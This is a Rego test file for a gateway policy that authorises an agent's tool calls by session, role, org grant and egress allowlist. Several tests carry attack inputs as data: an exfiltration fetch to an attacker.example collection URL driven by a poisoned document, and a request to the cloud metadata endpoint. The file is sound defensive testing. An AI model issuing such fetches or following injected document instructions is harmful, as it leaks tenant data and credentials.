# Policy tests, run by `opa test` against the SAME digest the gateway
# ships (PROPOSED-DEPS.md's one-pin rule: a separately-installed CI opa
# would test the policy with a different binary than the one that
# enforces it).
#
# These test the POLICY. The gate's behaviour when OPA itself fails is a
# different question with a different instrument -- the fault shims in
# gateway/test_faults/ -- because no amount of policy testing can tell
# you what happens when the policy engine is dead.
#
# M3 T6: every authority leg is tested on BOTH sides -- denied alone (the
# other legs passing, so the reason is the leg's own) and allowed. A leg
# tested only for its deny cannot be told apart from a leg that denies
# everything (the plan's M3 T0 D3 and T6 acceptance line).

package bazaar.gate_test

import rego.v1

import data.bazaar.gate

acme := "0a000000-0000-4000-8000-000000000001"

initech := "0a000000-0000-4000-8000-000000000003"

policy_data := {
	"tools": ["read_document", "http_fetch", "update_document", "delete_document"],
	"org_grants": {
		acme: ["read_document", "http_fetch", "update_document", "delete_document"],
		initech: ["read_document"],
	},
	"egress_allowlist": ["docs.example", "metadata.google.internal"],
}

all_pass := {"within_time": true, "in_scope": true, "role_permits": true}

# A call in Acme, every authority leg passing, clean provenance. Each test
# changes only what it is about.
call(tool, extra) := object.union(
	{
		"tool": tool,
		"args": {},
		"session": {"id": "s-1", "org": acme, "acting_for": "u-1"},
		"provenance": {"derived_from": ["user"]},
		"resolved": {},
		"authority": {"role_now": "admin", "legs": all_pass},
	},
	extra,
)

# replace swaps a whole top-level subtree. object.union MERGES nested
# objects, so a union could never express "this leg is missing" or "this
# session has no org" -- the base's values would survive the merge.
replace(obj, key, val) := object.union(object.remove(obj, [key]), {key: val})

with_legs(tool, legs) := replace(call(tool, {}), "authority", {"role_now": "viewer", "legs": legs})

decide(inp) := d if {
	d := gate.decision with input as inp
		with data.tools as policy_data.tools
		with data.org_grants as policy_data.org_grants
		with data.egress_allowlist as policy_data.egress_allowlist
}

clean_fetch := {
	"args": {"url": "http://docs.example/a"},
	"resolved": {"host": "docs.example", "ip": "93.184.216.34", "denied_range": false},
}

# --- the allow path: every tool, every leg passing --------------------

test_each_document_tool_is_allowed_when_every_leg_passes if {
	every tool in ["read_document", "update_document", "delete_document"] {
		decide(call(tool, {})).route == "allow"
	}
}

test_clean_fetch_to_an_allowlisted_host_is_allowed if {
	decide(call("http_fetch", clean_fetch)).route == "allow"
}

# --- each authority leg, denied alone ---------------------------------

test_expired_session_is_denied_with_its_own_reason if {
	d := decide(with_legs("delete_document", {"within_time": false, "in_scope": true, "role_permits": true}))
	d.reasons == ["session_expired"]
}

test_out_of_scope_tool_is_denied_with_its_own_reason if {
	d := decide(with_legs("delete_document", {"within_time": true, "in_scope": false, "role_permits": true}))
	d.reasons == ["not_in_session_scope"]
}

# Finding 05's hardened reason: the viewer's session asked for delete in
# its scope (consent, M3-N5), the org grants it, and the ROLE refuses it.
test_role_below_the_action_is_denied_with_its_own_reason if {
	d := decide(with_legs("delete_document", {"within_time": true, "in_scope": true, "role_permits": false}))
	d.reasons == ["role_does_not_permit"]
}

# The org-grant leg, both sides, on seeded data: Initech is granted
# read_document only.
test_org_grant_allows_what_it_lists if {
	inp := call("read_document", {"session": {"id": "s-2", "org": initech, "acting_for": "u-2"}})
	decide(inp).route == "allow"
}

test_org_grant_absent_denies_what_it_does_not_list if {
	inp := call("http_fetch", object.union(clean_fetch, {"session": {"id": "s-2", "org": initech, "acting_for": "u-2"}}))
	decide(inp).reasons == ["org_grant_absent"]
}

# No default grant: an org the data does not list is granted nothing.
test_an_unlisted_org_is_granted_nothing if {
	inp := call("read_document", {"session": {"id": "s-3", "org": "0a000000-0000-4000-8000-0000000000ff", "acting_for": "u"}})
	decide(inp).reasons == ["org_grant_absent"]
}

# --- fail closed: a leg that is missing or not exactly true FAILS -----

test_no_authority_at_all_is_denied if {
	inp := json.remove(call("read_document", {}), ["authority"])
	d := decide(inp)
	d.route == "deny"
	d.reasons == ["session_expired"]
}

test_each_missing_leg_fails_on_its_own if {
	decide(with_legs("read_document", {"in_scope": true, "role_permits": true})).reasons == ["session_expired"]
	decide(with_legs("read_document", {"within_time": true, "role_permits": true})).reasons == ["not_in_session_scope"]
	decide(with_legs("read_document", {"within_time": true, "in_scope": true})).reasons == ["role_does_not_permit"]
}

test_a_truthy_string_is_not_a_pass if {
	decide(with_legs("read_document", {"within_time": "true", "in_scope": true, "role_permits": true})).reasons == ["session_expired"]
}

test_no_session_org_is_granted_nothing if {
	inp := replace(call("read_document", {}), "session", {"id": "s-1"})
	decide(inp).reasons == ["org_grant_absent"]
}

# Empty grants grant nothing. (`opa test` loads this directory's data.json,
# so org_grants cannot be made ABSENT here; the policy's `default
# org_grants := {}` makes absent behave exactly like this empty map.)
test_empty_org_grants_grant_nothing if {
	d := gate.decision with input as call("read_document", {})
		with data.tools as policy_data.tools
		with data.org_grants as {}
		with data.egress_allowlist as policy_data.egress_allowlist
	d.reasons == ["org_grant_absent"]
}

# --- order: the first failing leg is the one reported -----------------

test_order_time_before_scope_before_role if {
	decide(with_legs("delete_document", {"within_time": false, "in_scope": false, "role_permits": false})).reasons == ["session_expired"]
	decide(with_legs("delete_document", {"within_time": true, "in_scope": false, "role_permits": false})).reasons == ["not_in_session_scope"]
}

test_order_grant_before_role if {
	inp := object.union(
		with_legs("delete_document", {"within_time": true, "in_scope": true, "role_permits": false}),
		{"session": {"id": "s-2", "org": initech, "acting_for": "u-2"}},
	)
	decide(inp).reasons == ["org_grant_absent"]
}

# The 03 least-privilege variant (D7): a session scoped to read_document
# only, steered into the exfiltration fetch. The scope leg refuses it
# before the egress legs run.
test_03_least_privilege_dies_at_the_scope if {
	inp := object.union(
		with_legs("http_fetch", {"within_time": true, "in_scope": false, "role_permits": true}),
		{
			"args": {"url": "http://attacker.example/collect?data=x"},
			"provenance": {"derived_from": ["user", "untrusted"]},
			"resolved": {"host": "attacker.example", "ip": "172.20.0.9", "denied_range": true},
		},
	)
	decide(inp).reasons == ["not_in_session_scope"]
}

# A role failure outranks the egress legs too.
test_role_before_egress if {
	inp := object.union(
		with_legs("http_fetch", {"within_time": true, "in_scope": true, "role_permits": false}),
		{"resolved": {"host": "attacker.example", "ip": "172.20.0.9", "denied_range": true}},
	)
	decide(inp).reasons == ["role_does_not_permit"]
}

# --- M2's findings, unchanged under passing authority -----------------

# THE ORDERING TEST. attacker.example fails the allowlist leg AND the
# range leg (the Compose bridge is RFC1918) AND the provenance leg (the
# document is untrusted). Exactly one reason must come back, and it must
# be the allowlist -- otherwise finding 03's evidence becomes "private
# address", which is an artifact of the lab rather than the control.
test_finding_03_dies_at_the_allowlist_with_one_reason if {
	d := decide(call("http_fetch", {
		"args": {"url": "http://attacker.example/collect?data=x"},
		"provenance": {"derived_from": ["user", "untrusted"]},
		"resolved": {"host": "attacker.example", "ip": "172.20.0.9", "denied_range": true},
	}))
	d.route == "deny"
	d.reasons == ["egress_not_allowlisted"]
}

test_finding_04_passes_the_allowlist_and_dies_at_the_range if {
	d := decide(call("http_fetch", {
		"args": {"url": "http://metadata.google.internal/computeMetadata/v1/"},
		"resolved": {"host": "metadata.google.internal", "ip": "169.254.169.254", "denied_range": true},
	}))
	d.reasons == ["resolved_address_denied"]
}

# The same finding driven THROUGH the poisoned document: untrusted
# provenance is present, and the reason must not change. This is why the
# range leg sits before the provenance leg -- the asserted evidence must
# not depend on how the PoC chose to drive the call.
test_finding_04_reason_is_stable_under_untrusted_provenance if {
	d := decide(call("http_fetch", {
		"args": {"url": "http://metadata.google.internal/computeMetadata/v1/"},
		"provenance": {"derived_from": ["user", "untrusted"]},
		"resolved": {"host": "metadata.google.internal", "ip": "169.254.169.254", "denied_range": true},
	}))
	d.reasons == ["resolved_address_denied"]
}

# SR-B7-2: allowlisting is a host decision, never a payload decision. An
# allowlisted destination with a public address and tenant-derived
# content is still a denial.
test_tenant_data_to_an_allowlisted_host_is_denied if {
	d := decide(call("http_fetch", object.union(clean_fetch, {"provenance": {"derived_from": ["user", "untrusted"]}})))
	d.reasons == ["tenant_data_egress"]
}

# --- the tool leg -----------------------------------------------------

test_an_unknown_tool_is_denied if {
	decide(call("exfiltrate", {})).reasons == ["unknown_tool"]
}

# set_member_role is not a known tool until T7 lists it -- and T7 lists it
# only to deny it explicitly (control_plane_not_delegable). Until then it
# dies here, even for an admin whose every authority leg passes.
test_set_member_role_is_unknown_until_t7 if {
	decide(call("set_member_role", {})).reasons == ["unknown_tool"]
}

# Empty input must not be an allow. A policy whose empty case allows is
# the shape a garbage-emitting engine turns into a bypass.
test_empty_input_is_denied if {
	decide({}).route == "deny"
}
